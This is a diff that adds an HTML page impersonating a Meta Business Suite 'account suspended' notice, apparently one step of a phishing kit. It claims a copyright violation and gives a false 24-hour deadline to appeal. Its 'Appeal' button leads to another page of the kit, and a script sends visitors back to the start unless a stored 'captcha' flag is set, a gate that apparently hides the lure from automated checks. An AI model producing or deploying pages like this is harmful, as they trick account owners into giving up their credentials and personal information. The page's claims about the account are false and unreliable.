@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <title>Meta Business</title>
+    <meta name="description" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link rel="shortcut icon" href="../img/favicon.ico" type="image/x-icon" />
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700&family=Nunito:wght@300;400;500;600&family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet" />
+    <style>
+        * {
+          margin: 0;
+          padding: 0;
+          box-sizing: border-box;
+          list-style: none;
+          text-decoration: none;
+          max-width: 100%;
+          font-family: sans-serif;
+        }
+      
+        body {
+          background-color: #f0f1f5;
+          min-height: 100vh;
+          width: 100vw;
+          display: block;
+          justify-content: center;
+          align-items: center;
+          text-align: center;
+        }
+        
+header {
+  height: max-content;
+  background-color: white;
+  padding: 0px 27px 0;
+  box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); /* Add box shadow at the bottom */
+}
+
+.top {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: 80px;
+}
+
+.logo {
+  display: flex;
+  align-items: center;
+  gap: 0;
+}
+
+.logo p {
+  font-size: 18px;
+  margin: 0 80px 0 4px;
+}
+
+.logo ul li {
+  color: #747474;
+}
+        .fix{
+display: flex;
+align-items: center;
+justify-content: center;
+padding-bottom: 50px;
+padding-top: 50px;
+}
+
+        .container {
+          background-color: #ffffff;
+          width: 100%;
+          max-width: 651px;
+          border: 0px solid #9f9f9f;
+          border-radius: 12px;
+          overflow: hidden;
+          padding: 20px;
+        }
+      
+        #image_1 {
+          width: 6%;
+        }
+      
+        .logo_intro img {
+          width: 40px;
+        }
+      
+        h1.logo_intro {
+          font-weight: 600;
+          font-size: 13px;
+        }
+        h1.sus {
+          padding-top: 10px;
+          font-weight: 700;
+          font-size: 20px;
+        }
+      
+        h3 {
+          font-weight: 500;
+          padding-top: 12px;
+          font-size: 19px;
+          color: #181818;
+        }
+      
+        p {
+          font-weight: 500;
+          font-size: 12px;
+          color: #9f9f9f;
+        }
+        #continueButton {
+          width: 95%;
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          background-color: #1a73e3;
+          color: #ffffff;
+          font-size: 14px;
+          font-weight: 600;
+          margin: 10px;
+          padding: 15px 5px;
+          border: none;
+          border-radius: 5px;
+        }
+      
+        @media (max-width: 766px) {
+          h1.logo_intro {
+            font-size: 12px;
+          }
+        }
+        @media (max-width: 766px) {
+          .sus {
+            font-size: 22px;
+          }
+        }
+        .reason{
+          padding-top: 5%;
+          text-align: left;
+        }
+        .reason h1{
+          color: #181818;
+          font-size: 21px;
+          font-weight: 600;
+        
+        }
+        .reason p{
+          color: #494949;
+          font-size: 16px;
+        
+        }
+        a#msnnr_btn_anc {
+            position: relative;
+            float: left;
+        }
+   
+        div#messenger_button {
+            position: relative;
+            float: left;
+            color: #000000;
+            font-family: arial;
+            border-radius: 3px;
+            overflow: hidden;
+            text-decoration: none;
+        }
+
+        .messenger_column {
+            float: right;
+            padding: 5px;
+        }
+
+        .messenger_column.btn_icon>#msngr_btn_icon {
+            float: right;
+            width: 20px;
+        }
+
+        .messenger_column.btn_label {
+            padding: 5px;
+            padding-right: 5px;
+        }
+        .messenger_column.btn_icon {
+  width: 30px; /* Adjust the width and height to your preference */
+  height: 30px;
+  background-color: #f0f1f5;
+  border-radius: 50%; /* Makes the element circular */
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+#msngr_btn_icon {
+  width: 50px; /* Adjust the size of the SVG icon */
+  height: 50px; /* Adjust the size of the SVG icon */
+  fill: white; /* Set the color of the SVG icon */
+}
+.read_div{
+  padding-top: 20px;
+  padding-bottom: 40px;
+
+}
+#readmore{
+  font-size: 14px;
+  font-weight: 600;
+}
+#continueButton:hover {
+    cursor: pointer;
+}
+.footer {
+  background-color: #182931;
+  padding: 30px 20px;
+}
+
+
+.footer-content {
+  display: flex;
+  justify-content: space-around;
+  align-items: center;
+  flex-wrap: wrap;
+}
+
+#yes{
+  padding-left: 20px;
+  padding-bottom: 10px;
+  font-size: 15px;
+  font-weight: 500;
+  color: #ffffff;
+}
+
+
+section:last-of-type {
+  display: none;
+}
+.contact-info, .social-media {
+  margin-bottom: 20px;
+}
+
+.contact-info h3, .social-media h3 {
+  font-size: 16px;
+  font-weight: bold;
+  margin-bottom: 10px;
+}
+
+.contact-info p {
+  color: white;
+  font-size: 14px;
+}
+
+.social-media a {
+  display: block;
+  margin-bottom: 5px;
+  font-size: 14px;
+  text-decoration: none;
+  color: #343a40;
+}
+
+.footer-bottom {
+  text-align: center;
+  margin-top: 20px;
+  font-size: 14px;
+  color: #6c757d;
+}
+
+.footer-coloring{
+  color: #ffffff;
+}
+.contact-info {
+  text-align: left; /* Center the text in each block */
+}
+
+.contact-info p {
+  margin: 0; /* Remove default margin */
+}
+@media (max-width: 768px) {
+  .footer-content {
+      flex-direction: column; /* Change to a vertical layout */
+      align-items: flex-start; /* Align items to the start of the column */
+  }
+
+  .contact-info {
+      margin-bottom: 23px; /* Add some space between items */
+  }
+  #yes {
+    padding-bottom: 10px;
+  } 
+  .social-icons {
+    padding-bottom: 10px;
+  }
+}
+
+.social-icons {
+  display: flex;
+  align-items: left;
+}
+
+.social-icons img {
+  width: 30px; /* Adjust the size as needed */
+  margin-right: 10px; /* Adjust the spacing between icons */
+}
+
+
+</style>
+</head>
+
+<body>
+  <header>
+    <div class="top">
+      <div class="logo">
+        <img src="../img/meta2.png" alt="" width="100">
+        <p>Meta Business Suite</p>
+        
+      </div>
+      
+    </div>
+    
+  </header>
+  <div class="fix">
+    <div class="container">
+        
+      <div class="image_1"><img style="width:6%" src="../img/meta-logo.jpeg" alt="" /></div>
+      <img width="40" src="./img/meta-logo.jpeg" alt="" />
+        <h1 class="logo_intro">Meta Copyright Infringement</h1>
+        <h1 class="sus">We suspended your account</h1>
+        <h3>24 hours left to appeal or we'll permanently disable your account</h3>
+        <p>Suspended on 08/04/2024</p>
+        <!-- October 16, 2023 -->
+        <!-- <p>Meta uses security tests to ensure that the people on the site are real. Please fill the security check below to continue further.</p> -->
+       <div class="reason-all">
+        <div class="reason">
+          <h1>What this means</h1>
+          <p>Your account is not visible to people on Facebook right now, and you cannot use it.</p>
+        </div>
+        <div class="reason">
+          <h1>What you can do</h1>
+          <p>You have 24 hours left to appeal our decision. we may need to collect some info fom you that's help us review your account again.</p>
+        </div>
+        <div class="reason">
+          <h1>Why this happened</h1>
+          <p>Your account, or activity on it, doesn't follow our Community Standards on account intergrity and authentic identity </p>
+        </div>
+     
+
+      </div>
+    
+      <div class="read_div">
+        <a id="msnnr_btn_anc" href="#">
+          <div id="messenger_button">
+              <div class="messenger_column btn_label">
+                  <span id="readmore">Read more about this rule</span>
+              </div>
+              <div class="messenger_column btn_icon">
+                  <img src="book.svg" id="msngr_btn_icon">
+              </div>
+          </div>
+      </a>  
+       </div>
+       <div class="reason">
+        <h1>More information</h1>
+      </div>
+      <div class="read_div">
+        <a id="msnnr_btn_anc" href="#">
+          <div id="messenger_button">
+              <div class="messenger_column btn_label">
+                  <span id="readmore">Read more about this rule</span>
+              </div>
+              <div class="messenger_column btn_icon">
+                  <img src="shield.svg" id="msngr_btn_icon">
+              </div>
+          </div>
+      </a>  
+       </div>
+        <button id="continueButton" type="button" class="continue">Appeal</button>
+   
+    </div>
+    </div>
+
+    <footer class="footer">
+      <div class="footer-content">
+          <div class="loxgo">
+              <p id="yes">@ 2023 Meta</p>
+              <div class="social-icons">
+                <img src="../footer/fb.svg" alt="Facebook Icon">
+                <img src="../footer/ig.svg" alt="Instagram Icon">
+                <img src="../footer/t.svg" alt="Twitter Icon">
+                <img src="../footer/lin.svg" alt="LinkedIn Icon">
+            </div>
+          </div>
+          <div class="contact-info">
+              <p>About</p><br>
+              <p>English (UK)</p>
+          </div>
+          <div class="contact-info">
+              <p>Developers</p><br>
+              <p>English (US)</p>
+          </div>
+          <div class="contact-info">
+              <p>Careers</p><br>
+              <p>Español</p>
+          </div>
+          <div class="contact-info">
+              <p>Privacy</p><br>
+              <p>Português</p>
+          </div>
+          <div class="contact-info">
+              <p>Cookies</p><br>
+              <p>Français</p>
+          </div>
+      </div>
+    
+      <div class="footer-bottom">
+          <p>© 2023 Meta Business Suite. All rights reserved.</p>
+      </div>
+  </footer>
+    <script>
+        document.getElementById("continueButton").onclick = function () {
+            location.href = "./index.html";
+        };
+    //
+    var captcha2 = localStorage.getItem("captcha");
+        if(captcha2 == "true"){
+        }
+        else{
+           window.location = "../index.html";
+        }
+    </script>
+    
+</body>
+
+</html>
